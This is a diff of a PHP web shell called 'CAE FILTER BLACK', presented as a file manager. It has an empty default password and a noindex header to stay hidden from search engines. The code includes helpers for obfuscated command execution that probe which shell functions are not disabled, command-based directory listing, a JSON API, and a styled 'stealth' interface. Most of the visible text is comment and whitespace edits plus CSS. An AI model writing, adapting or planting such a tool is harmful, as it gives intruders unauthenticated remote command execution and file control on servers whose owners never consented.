@@ -1,7 +1,4 @@
 <?php
-// ================================================================
-// CAE FILTER BLACK - File Manager with Command Fallback
-// ================================================================
 
 @ini_set('display_errors', '0');
 @ini_set('log_errors', '1');
@@ -15,7 +12,6 @@ if (!defined('DIRECTORY_SEPARATOR')) {
     define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
 }
 
-// polyfills
 if (!function_exists('sys_get_temp_dir')) {
     function sys_get_temp_dir() {
         if (!empty($_ENV['TMP'])) return realpath($_ENV['TMP']);
@@ -67,7 +63,6 @@ if (!function_exists('hex2bin')) {
     }
 }
 
-// session
 @ini_set('session.save_handler', 'files');
 $sp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'sess';
 if (!@is_dir($sp)) @mkdir($sp, 0700, true);
@@ -77,8 +72,7 @@ if (@is_dir($sp) && @is_writable($sp)) @ini_set('session.save_path', $sp);
 if (function_exists('session_status') ? session_status()===PHP_SESSION_NONE : session_id()==='') @session_start();
 if (!isset($_SESSION)) $_SESSION = array();
 
-// optional password
-define('_AUTH', ''); // isi password jika ingin
+define('_AUTH', '');
 if (_AUTH !== '') {
     if (!isset($_SESSION['_logged']) || $_SESSION['_logged'] !== true) {
         if (isset($_POST['_pass']) && hash_equals(_AUTH, $_POST['_pass'])) {
@@ -87,19 +81,17 @@ if (_AUTH !== '') {
             exit;
         }
         echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background:#121212;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}form{background:#1c1c1e;padding:40px;border-radius:12px;}input,button{padding:10px;margin:5px;}</style></head><body>';
-        echo '<form method="post"><h2>Access</h2><input type="password" name="_pass" placeholder="Enter password"><button type="submit">Login</button></form>';
+        echo '<form method="post"><h2>CAE Access</h2><input type="password" name="_pass" placeholder="Enter password"><button type="submit">Login</button></form>';
         echo '</body></html>';
         exit;
     }
 }
 
-// headers
 header('X-Robots-Tag: noindex, nofollow');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 header('X-Content-Type-Options: nosniff');
 header('X-Frame-Options: DENY');
 
-// ---------- helpers ----------
 function ax_post($k,$d=null) { return isset($_POST[$k])?$_POST[$k]:$d; }
 function ax_get($k,$d=null)  { return isset($_GET[$k])?$_GET[$k]:$d; }
 
@@ -197,7 +189,6 @@ function ax_build_archive($items, $namePrefix) {
     return false;
 }
 
-// ---------- command execution (all methods, obfuscated) ----------
 function _is_func_avail($func) {
     if (!function_exists($func)) return false;
     $disabled = @ini_get('disable_functions');
@@ -276,7 +267,6 @@ function _run_cmd($cmd) {
 $commandAvailable = false;
 foreach ($_cmds as $fn) { if (_is_func_avail($fn)) { $commandAvailable = true; break; } }
 
-// ---------- command-based directory helpers ----------
 function _dir_exists($path) {
     global $commandAvailable;
     if (@is_dir($path)) return true;
@@ -302,9 +292,7 @@ function _list_dir($path) {
             $result = array();
             foreach ($items as $line) {
                 $line = trim($line);
-                if ($line !== '' && $line !== '.' && $line !== '..') {
-                    $result[] = $line;
-                }
+                if ($line !== '' && $line !== '.' && $line !== '..') $result[] = $line;
             }
             return $result;
         }
@@ -317,9 +305,7 @@ function _list_dir($path) {
             $result = array();
             foreach ($items as $line) {
                 $line = trim($line);
-                if ($line !== '' && $line !== '.' && $line !== '..') {
-                    $result[] = $line;
-                }
+                if ($line !== '' && $line !== '.' && $line !== '..') $result[] = $line;
             }
             return $result;
         }
@@ -378,7 +364,6 @@ function _get_file_info($path) {
     }
 }
 
-// ---------- safeRealPath with command fallback ----------
 function safeRealPath($path, $base='') {
     if ($base && !preg_match('/^([a-zA-Z]:)?[\\\\\/]/', $path)) {
         $path = rtrim($base, '/\\') . DIRECTORY_SEPARATOR . $path;
@@ -396,14 +381,12 @@ function safeRealPath($path, $base='') {
     return false;
 }
 
-// ---------- current directory ----------
 if (!isset($_SESSION['cwd']) || !safeRealPath($_SESSION['cwd'])) {
     $cwd = @getcwd();
     if ($cwd === false || $cwd === '') $cwd = dirname(__FILE__);
     $_SESSION['cwd'] = $cwd;
 }
 
-// ---------- JSON API ----------
 $method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
 $isJson = isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false;
 
@@ -608,7 +591,6 @@ if ($method === 'POST' && $isJson) {
     }
 }
 
-// ---------- HTML output ----------
 $errorMsg = '';
 $currentDirectory = $_SESSION['cwd'];
 
@@ -666,7 +648,7 @@ $allItems = array_merge($folders, $files);
 <title>CAE FILTER BLACK</title>
 <meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
 <style>
-/* --- same as original CAE 2.5 style --- */
+/* --- Full CAE 2.5 theme with dark/light toggle --- */
 .stealth-fm{--fm-bg-main:#121212;--fm-bg-panel:#1C1C1E;--fm-border-color:#2C2C2E;--fm-text-primary:#F2F2F7;--fm-text-muted:#8E8E93;--fm-accent:#D31D34;--fm-accent-hover:#E5223A;--fm-accent-text:#FFF;--fm-accent-soft:rgba(211,29,52,0.12);--fm-hover-bg:rgba(242,242,247,0.04);--fm-focus-ring:rgba(211,29,52,0.3);--fm-font-stack:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;--fm-font-mono:'JetBrains Mono',SFMono-Regular,Menlo,Monaco,Consolas,monospace;--fm-radius-lg:12px;--fm-radius-md:8px;--fm-radius-sm:6px;--fm-danger:#FF453A;--fm-danger-bg:rgba(255,69,58,0.12);--fm-success:#30D158;--fm-success-bg:rgba(48,209,88,0.12);--fm-transition:all 0.25s ease-in-out;box-sizing:border-box;font-family:var(--fm-font-stack);background-color:var(--fm-bg-main);color:var(--fm-text-primary);min-height:100vh;padding:32px 24px;line-height:1.5;-webkit-font-smoothing:antialiased}
 .stealth-fm.light{--fm-bg-main:#F4F4F6;--fm-bg-panel:#FFF;--fm-border-color:#E5E5EA;--fm-text-primary:#1C1C1E;--fm-text-muted:#8E8E93;--fm-accent:#B51A2B;--fm-accent-hover:#9E1423;--fm-accent-text:#FFF;--fm-accent-soft:rgba(181,26,43,0.08);--fm-hover-bg:rgba(28,28,30,0.04);--fm-focus-ring:rgba(181,26,43,0.25);--fm-danger:#D32F2F;--fm-danger-bg:rgba(211,47,47,0.08);--fm-success:#2E7D32;--fm-success-bg:rgba(46,125,50,0.08)}
 .stealth-fm *,.stealth-fm *::before,.stealth-fm *::after{box-sizing:border-box;margin:0;padding:0;transition:var(--fm-transition)}body{margin:0;padding:0}.stealth-fm .container{max-width:1400px;margin:0 auto}.stealth-fm .header{margin-bottom:28px}.stealth-fm .header-top{display:flex;align-items:center;justify-content:space-between}.stealth-fm .logo{display:flex;flex-direction:column;align-items:flex-start;gap:2px}.stealth-fm .logo-text{font-size:28px;font-weight:700;letter-spacing:-0.5px;color:var(--fm-text-primary)}.stealth-fm .logo-text span{color:var(--fm-accent)}.stealth-fm .logo-sub{font-size:11px;color:var(--fm-text-muted);text-transform:uppercase;letter-spacing:2px;font-weight:500}.stealth-fm .card{background-color:var(--fm-bg-panel);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-lg);overflow:hidden;margin-bottom:24px;box-shadow:0 4px 20px rgba(0,0,0,0.15)}.stealth-fm .card-header{padding:16px 24px;border-bottom:1px solid var(--fm-border-color);display:flex;align-items:center;justify-content:space-between;background-color:var(--fm-bg-panel);position:relative}.stealth-fm .card-header::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background-color:var(--fm-accent)}.stealth-fm .card-title{font-size:14px;font-weight:600;letter-spacing:-0.01em;display:flex;align-items:center;gap:10px;color:var(--fm-text-primary)}.stealth-fm .card-body{padding:24px}.stealth-fm .file-table{width:100%;border-collapse:collapse}.stealth-fm .file-table th{padding:14px 20px;text-align:left;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.08em;color:var(--fm-text-muted);background-color:var(--fm-bg-main);border-bottom:1px solid var(--fm-border-color)}.stealth-fm .file-table td{padding:14px 20px;border-bottom:1px solid var(--fm-border-color);vertical-align:middle}.stealth-fm .file-table tr:last-child td{border-bottom:none}.stealth-fm .file-table tr:hover td{background-color:var(--fm-hover-bg)}.stealth-fm .file-name-cell{display:flex;align-items:center}.stealth-fm .file-icon{width:32px;height:32px;border-radius:var(--fm-radius-sm);display:flex;align-items:center;justify-content:center;margin-right:12px;flex-shrink:0;background-color:var(--fm-hover-bg);border:1px solid var(--fm-border-color)}.stealth-fm .file-icon svg{width:16px;height:16px;stroke:var(--fm-accent);fill:none;stroke-width:2}.stealth-fm .file-icon .ext{font-size:9px;font-weight:700;color:var(--fm-accent);letter-spacing:0.5px}.stealth-fm .file-name{font-size:14px;font-weight:500;color:var(--fm-text-primary);text-decoration:none}.stealth-fm .file-name:hover{color:var(--fm-accent)}.stealth-fm .file-meta{font-size:12px;font-weight:400;color:var(--fm-text-muted);font-family:var(--fm-font-mono)}.stealth-fm .perms{font-family:var(--fm-font-mono);font-size:12px;padding:4px 8px;border-radius:var(--fm-radius-sm);font-weight:500}.stealth-fm .perms.writable{background-color:var(--fm-success-bg);color:var(--fm-success)}.stealth-fm .perms.readonly{background-color:var(--fm-danger-bg);color:var(--fm-danger)}.stealth-fm .input-group{display:flex;gap:12px;margin-bottom:12px}.stealth-fm input[type="text"],.stealth-fm input[type="file"],.stealth-fm select,.stealth-fm textarea{background-color:var(--fm-bg-main);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-md);padding:10px 14px;color:var(--fm-text-primary);font-size:14px;outline:none;font-family:var(--fm-font-stack)}.stealth-fm input[type="text"]:focus,.stealth-fm textarea:focus,.stealth-fm select:focus{border-color:var(--fm-accent);box-shadow:0 0 0 3px var(--fm-focus-ring)}.stealth-fm input[type="file"]::file-selector-button{background-color:var(--fm-bg-panel);color:var(--fm-text-primary);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-sm);padding:8px 14px;font-size:13px;cursor:pointer;margin-right:12px}.stealth-fm input[type="file"]::file-selector-button:hover{border-color:var(--fm-accent);background-color:var(--fm-accent-soft)}.stealth-fm textarea{font-family:var(--fm-font-mono);font-size:13px;line-height:1.6;resize:vertical;width:100%;box-sizing:border-box}.stealth-fm .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:10px 18px;font-size:13px;font-weight:600;border-radius:var(--fm-radius-md);cursor:pointer;border:1px solid transparent;text-decoration:none;font-family:inherit}.stealth-fm .btn-primary,.stealth-fm .btn-success{background-color:var(--fm-accent);color:var(--fm-accent-text);box-shadow:0 2px 8px rgba(211,29,52,0.25)}.stealth-fm .btn-primary:hover,.stealth-fm .btn-success:hover{background-color:var(--fm-accent-hover)}.stealth-fm .btn-ghost{background-color:transparent;color:var(--fm-text-primary);border-color:var(--fm-border-color)}.stealth-fm .btn-ghost:hover{background-color:var(--fm-accent-soft);border-color:var(--fm-accent);color:var(--fm-accent)}.stealth-fm .btn-danger{background-color:var(--fm-danger-bg);color:var(--fm-danger);border-color:rgba(255,69,58,0.2)}.stealth-fm .btn-danger:hover{background-color:rgba(255,69,58,0.25)}.stealth-fm .btn-sm{padding:6px 12px;font-size:12px;border-radius:var(--fm-radius-sm)}.stealth-fm .theme-toggle{padding:8px 16px;font-size:12px;font-weight:600;border-radius:var(--fm-radius-md);cursor:pointer;background:var(--fm-bg-panel);color:var(--fm-text-primary);border:1px solid var(--fm-border-color)}.stealth-fm .theme-toggle:hover{border-color:var(--fm-accent);color:var(--fm-accent)}.stealth-fm .alert{padding:14px 18px;border-radius:var(--fm-radius-md);margin-bottom:20px;font-size:14px;display:flex;align-items:center;gap:12px}.stealth-fm .alert-danger{background-color:var(--fm-danger-bg);border:1px solid rgba(255,59,48,0.2);color:var(--fm-danger)}.stealth-fm .actions{display:flex;gap:6px;justify-content:flex-end}.stealth-fm input[type="checkbox"]{width:16px;height:16px;accent-color:var(--fm-accent);cursor:pointer}.stealth-fm .console{background-color:var(--fm-bg-main);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-md);padding:16px;font-family:var(--fm-font-mono);font-size:13px;color:var(--fm-text-primary);max-height:250px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}.stealth-fm .bulk-bar{display:none;gap:12px;align-items:center;padding:14px 20px;background-color:var(--fm-bg-panel);border:1px solid var(--fm-accent);border-radius:var(--fm-radius-md);margin-bottom:20px;box-shadow:0 4px 15px var(--fm-accent-soft)}.stealth-fm .bulk-bar.show{display:flex}.stealth-fm .bulk-count{color:var(--fm-text-primary);font-weight:600;margin-right:auto}.stealth-fm .modal{display:none;position:fixed;inset:0;z-index:100;background:rgba(0,0,0,0.6);backdrop-filter:blur(6px);align-items:center;justify-content:center}.stealth-fm .modal.show{display:flex}.stealth-fm .modal-content{background-color:var(--fm-bg-panel);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-lg);width:450px;max-width:90%;max-height:90vh;overflow:auto;box-shadow:0 20px 40px rgba(0,0,0,0.4)}.stealth-fm .modal-header{padding:18px 24px;border-bottom:1px solid var(--fm-border-color);display:flex;align-items:center;justify-content:space-between}.stealth-fm .modal-title{font-weight:600}.stealth-fm .modal-close{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:var(--fm-radius-sm);cursor:pointer;color:var(--fm-text-muted)}.stealth-fm .modal-close:hover{background-color:var(--fm-hover-bg);color:var(--fm-text-primary)}.stealth-fm .modal-body{padding:20px 24px 24px}.stealth-fm .chmod-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:20px 24px 0 24px}.stealth-fm .chmod-group{background-color:var(--fm-bg-main);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-md);padding:14px 8px;text-align:center}.stealth-fm .chmod-group-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.05em;color:var(--fm-text-muted);margin-bottom:10px}.stealth-fm .chmod-checkboxes{display:flex;justify-content:center;gap:6px}.stealth-fm .chmod-checkboxes label{font-size:11px;cursor:pointer;display:flex;align-items:center;gap:2px}#fm-loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:999;align-items:center;justify-content:center;color:#fff;font-weight:600;font-family:var(--fm-font-stack);backdrop-filter:blur(2px)}#fm-loading-overlay.show{display:flex}@media (max-width:768px){.stealth-fm .file-table th:nth-child(3),.stealth-fm .file-table td:nth-child(3),.stealth-fm .file-table th:nth-child(4),.stealth-fm .file-table td:nth-child(4),.stealth-fm .file-table th:nth-child(5),.stealth-fm .file-table td:nth-child(5),.stealth-fm .file-table th:nth-child(6),.stealth-fm .file-table td:nth-child(6){display:none}.stealth-fm .input-group{flex-direction:column}}
@@ -677,11 +659,11 @@ $allItems = array_merge($folders, $files);
 <div class="container">
 <div class="header">
 <div class="header-top">
-    <div class="logo">
-        <span class="logo-text">CAE <span>FILTER BLACK</span></span>
-        <span class="logo-sub">Cigarettes After Error &bull; YOUR FILEMANAGER</span>
-    </div>
-    <button class="theme-toggle" onclick="toggleTheme()">Toggle Light Mode</button>
+<div class="logo">
+<span class="logo-text">CAE <span>FILTER BLACK</span></span>
+<span class="logo-sub">Cigarettes After Error &bull; YOUR FILEMANAGER</span>
+</div>
+<button class="theme-toggle" onclick="toggleTheme()">Toggle Light Mode</button>
 </div>
 </div>
 
@@ -761,7 +743,6 @@ if (!$isDirectory && $ext) $iconHtml .= '<span class="ext">'.strtoupper($ext).'<
 <div id="fm-loading-overlay"></div>
 
 <script>
-// --- Same JavaScript as before ---
 (function(){ const saved = localStorage.getItem('fm_theme'); if(saved==='light'){ document.documentElement.style.visibility='hidden'; window.addEventListener('DOMContentLoaded',()=>{ document.querySelector('.stealth-fm').classList.add('light'); document.documentElement.style.visibility='visible'; }); } })();
 function toggleTheme(){ const fm = document.querySelector('.stealth-fm'); fm.classList.toggle('light'); localStorage.setItem('fm_theme', fm.classList.contains('light') ? 'light' : 'dark'); }
 function stringToHex(str){ let h=''; for(let i=0;i<str.length;i++){ let c=str.charCodeAt(i).toString(16); h += c.length<2?'0'+c:c; } return h; }
